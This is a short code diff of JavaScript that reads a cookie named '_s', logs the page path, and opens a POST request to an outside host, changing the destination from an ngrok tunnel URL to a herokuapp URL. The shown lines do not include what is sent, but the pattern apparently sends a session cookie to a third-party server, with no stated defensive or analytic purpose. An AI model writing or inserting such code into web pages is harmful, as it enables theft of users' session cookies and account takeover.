@@ -41,7 +41,7 @@
     console.log(document.location.pathname);
     console.log(GetCookie('_s'));
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://eed3593a.ngrok.io/stat', true);
+    xhr.open('POST', 'https://hidden-beyond-68630.herokuapp.com/stat', true);
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xhr.onload = function () {
         console.log(this.responseText);
